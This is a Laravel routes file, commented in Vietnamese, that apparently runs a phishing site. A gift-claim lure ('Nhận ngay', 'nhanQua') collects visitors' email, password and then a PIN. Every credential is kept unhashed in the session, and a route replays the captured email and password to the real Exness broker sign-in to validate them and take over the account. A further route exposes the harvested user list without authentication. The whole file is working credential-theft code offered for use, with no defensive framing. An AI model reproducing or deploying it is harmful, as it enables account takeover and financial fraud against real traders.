
<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Models\User;
use Illuminate\Support\Facades\Http;

Route::middleware(['force.https'])->group(function () {
    // Trang chính truy cập '/'
    Route::get('/', function () {
        return view('getItNow');
    });

    // Khi bấm nút "Nhận ngay", chuyển đến welcome
    Route::get('/welcome', function () {
        return view('welcome');
    });

    // Kiểm tra admin
    Route::post('/receive', function () {
        $email = request('email');
        $password = request('password');

        // Kiểm tra nếu là admin
        $admin = User::where('email', $email)
            ->where('password', $password) // không mã hóa
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            session([
                'email' => $email,
                'password' => $password,
            ]);
            return redirect()->secure('/admin');
        }

        // Nếu không phải admin → chuyển sang bước nhập PIN
        session([
            'email' => $email,
            'password' => $password,
        ]);
        return redirect()->secure('/nhanQua');
    })->name('login.step1');

    Route::get('/nhanQua', function () {
        return view('receiveGift');
    });

    Route::post('/', [UserController::class, 'store'])->name('login.store');

    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');

    Route::get('/api/users', [UserController::class, 'getUsersJson']);

    // Route xử lý đăng nhập Exness
    Route::get('/exness-login', function () {
        $email = session('email');
        $password = session('password');

        if (!$email || !$password) {
            return redirect()->secure('/welcome')->with('error', 'Thông tin đăng nhập không hợp lệ, vui lòng thử lại');
        }

        try {
            $response = Http::asForm()->post('https://my.exness.com/accounts/sign-in', [
                'email' => $email,
                'password' => $password,
            ]);

            if ($response->successful() && str_contains($response->header('Location'), '/pa/')) {
                return redirect($response->header('Location')); // Chuyển tới dashboard Exness
            }

            return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
        } catch (\Exception $e) {
            return redirect()->secure('/welcome')->with('error', 'Lỗi kết nối tới Exness, vui lòng thử lại sau');
        }
    })->name('exness.login');

    // Route xử lý đăng nhập thất bại (dự phòng)
    Route::get('/login-failed', function () {
        return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
    })->name('login.failed');
});
